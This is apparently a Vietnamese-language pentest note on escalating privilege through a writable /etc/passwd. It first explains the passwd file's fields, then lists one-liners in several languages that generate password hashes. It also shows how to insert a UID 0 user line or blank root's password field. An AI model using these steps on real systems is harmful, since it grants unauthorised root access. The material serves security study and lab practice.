# Editing /etc/passwd File for Privilege Escalation

# Tổng quan 

Thư mục /etc có 3 file quan trọng:
- etc/passwd: có thể đọc, lưu trữ thông tin tài khoản người dùng.
- ect/group: có thể đọc, lưu trữ thông tin người dùng thuộc nhóm nào.
- etc/shadow: thông tin mật khẩu được mã hóa, thời hạn, policy của mật khẩu.

![image](https://github.com/user-attachments/assets/5c842330-5249-4616-ab13-86b3472becca)

![image](https://github.com/user-attachments/assets/488d6116-3449-460b-aef6-b635fddde985)

Username: Tên của người dùng được sử dụng để đăng nhập.

Encrypted password: X biểu thị mật khẩu được mã hóa thực sự được lưu trữ bên trong tệp /shadow. Nếu người dùng không có mật khẩu thì trường mật khẩu sẽ có dấu *.

User Id (UID): Mỗi người dùng phải được cấp một ID người dùng (UID). UID 0 (không) được giữ cho người dùng root và UID 1-99 được giữ cho các tài khoản được xác định trước, UID 100-999 được hệ thống lưu giữ cho mục đích quản trị. UID 1000 hầu như luôn là người dùng phi hệ thống đầu tiên, thường là quản trị viên. Nếu chúng tôi tạo một người dùng mới trên hệ thống Ubuntu của mình, người dùng đó sẽ được cấp UID là 1001.

Group Id (GID): Nó biểu thị nhóm của từng người dùng; Giống như UID, 100 GID đầu tiên thường được giữ lại để sử dụng cho hệ thống. GID bằng 0 liên quan đến nhóm gốc và GID bằng 1000 thường biểu thị người dùng. Các nhóm mới thường được phân bổ GID bắt đầu từ 1000.

Gecos Field: Thông thường, đây là tập hợp các giá trị được phân tách bằng dấu phẩy cho biết thêm chi tiết liên quan đến người dùng. Định dạng cho trường GECOS biểu thị các thông tin sau:

Tên đầy đủ của người dùng

Số nhà và phòng hoặc người liên hệ

Số điện thoại văn phòng

Shell: Nó biểu thị đường dẫn đầy đủ của shell mặc định thực thi lệnh (bởi người dùng) và hiển thị kết quả.

LƯU Ý: Mỗi trường được phân tách bằng (dấu hai chấm)

# Các Kiểu edit

### Diều kiện tiên quyết: có quyền write file /etc/passwd

### Các cách edit
- openssl: `openssl passwd 123` ---> xxxxx
  
      user:xxxxx:0:0:root:/root:/bin/bash
- mkpasswd -m <method> <password>

      mkpasswd -m SHA-512 pass123
- python
  
      python3 -c 'import crypt; print (crypt.crypt("pass123", "$6$salt"))'
- perl

      perl -le 'print crypt("pass123", "abc")'
- php

      php -r "print(crypt('aarti','123') . \"\n\");"
- ruby

      ruby -r 'digest' -e 'puts "pass".crypt("$6$salt")'
- Đặc biệt có thể xóa kí tự x hoặc * của root trong file /etc/passwd

![image](https://github.com/user-attachments/assets/09a81c5d-1546-4874-9576-e60c552f5b7b)

![image](https://github.com/user-attachments/assets/49abd8a3-ad06-4824-ae72-f3041502d4f0)


